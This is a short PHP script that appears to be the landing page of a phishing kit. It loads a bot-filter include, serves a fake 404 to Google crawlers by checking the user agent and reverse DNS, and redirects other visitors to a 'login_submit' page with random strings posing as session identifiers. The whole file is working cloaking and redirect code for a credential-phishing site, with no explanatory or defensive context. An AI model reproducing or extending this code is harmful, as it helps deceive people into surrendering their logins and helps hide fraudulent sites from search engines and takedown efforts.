<?php 
session_start();
error_reporting(0);
include('akabotz/eyez.php');
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
$praga=rand();
$praga=md5($praga);
header("location: start.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");
?>